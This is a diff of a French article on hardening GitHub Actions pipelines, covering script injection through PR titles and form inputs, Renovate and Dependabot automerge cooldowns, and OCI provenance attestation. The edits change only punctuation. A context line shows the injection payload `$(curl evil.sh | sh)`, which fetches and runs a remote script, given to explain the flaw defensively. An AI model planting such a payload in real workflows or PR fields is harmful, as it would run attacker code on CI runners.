@@ -106,7 +106,7 @@ C'est la vuln la plus facile à introduire et la plus dure à voir en relecture.
 
 Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas, et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.
 
-Ce qui est contrôlé de l'extérieur est plus large qu'on ne croit : titre et corps de PR, nom de branche, message de commit, label, nom d'auteur. Et les `inputs` d'un `workflow_dispatch`, qui sont du texte libre tapé dans un formulaire — c'est le cas qu'on trouve dans `uno-multiplayer`, où le tag à republier partait directement dans un `echo` :
+Ce qui est contrôlé de l'extérieur est plus large qu'on ne croit : titre et corps de PR, nom de branche, message de commit, label, nom d'auteur. Et les `inputs` d'un `workflow_dispatch`, qui sont du texte libre tapé dans un formulaire - c'est le cas qu'on trouve dans `uno-multiplayer`, où le tag à republier partait directement dans un `echo` :
 
 ```yaml
 # Avant : le champ du formulaire est substitué dans la ligne
@@ -159,7 +159,7 @@ zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il cont
 
 ## Automerger sans avaler une release compromise
 
-L'automerge est le prolongement logique d'une CI en laquelle on a confiance : Renovate ouvre la PR, la CI passe, ça merge sans clic humain. On l'ouvre aux updates sûres — `minor`, `patch`, `digest` — et on garde les `major` en revue manuelle, seules à casser une API :
+L'automerge est le prolongement logique d'une CI en laquelle on a confiance : Renovate ouvre la PR, la CI passe, ça merge sans clic humain. On l'ouvre aux updates sûres (`minor`, `patch`, `digest`) et on garde les `major` en revue manuelle, seules à casser une API :
 
 ```json title="renovate.json"
 {
@@ -184,7 +184,7 @@ Reste un trou que la CI verte ne bouche pas : automerger une version publiée il
 
 `digest` est le type qu'on oublie, et c'est le plus intéressant des quatre. Un update `digest` seul veut dire que la version n'a pas bougé mais que le SHA derrière le tag, si, donc que quelqu'un a redéplacé `v7` sur un autre commit. C'est précisément le scénario contre lequel on épingle, et c'est aussi le type le plus automergé. Il a plus besoin du cooldown que les autres.
 
-Les deux règles ne se recouvrent pas : celle-ci ne pose que `minimumReleaseAge`, l'automerge reste défini par la règle précédente. Renovate applique les settings de chaque règle indépendamment, sans héritage de l'une vers l'autre, donc un `major` récupère le cooldown et rien d'autre — il attend toujours une revue.
+Les deux règles ne se recouvrent pas : celle-ci ne pose que `minimumReleaseAge`, l'automerge reste défini par la règle précédente. Renovate applique les settings de chaque règle indépendamment, sans héritage de l'une vers l'autre, donc un `major` récupère le cooldown et rien d'autre - il attend toujours une revue.
 
 Sur Dependabot, le même réglage se pose par écosystème, et il existe déjà par défaut à 3 jours :
 
@@ -248,7 +248,7 @@ Pour une image OCI, la provenance s'attache au digest et pas à un fichier, et `
           push-to-registry: true
 ```
 
-Le piège du `subject-name` : il doit être en minuscules. `metadata-action` minuscule le nom de l'image toute seule pour ses tags, l'attestation non, et GHCR refuse les majuscules — donc un repo dont l'owner a une capitale casse ici et nulle part ailleurs.
+Le piège du `subject-name` : il doit être en minuscules. `metadata-action` minuscule le nom de l'image toute seule pour ses tags, l'attestation non, et GHCR refuse les majuscules - donc un repo dont l'owner a une capitale casse ici et nulle part ailleurs.
 
 La vérification côté utilisateur tient en une commande, sans avoir à connaître l'identité du certificat comme pour `cosign verify` :
 
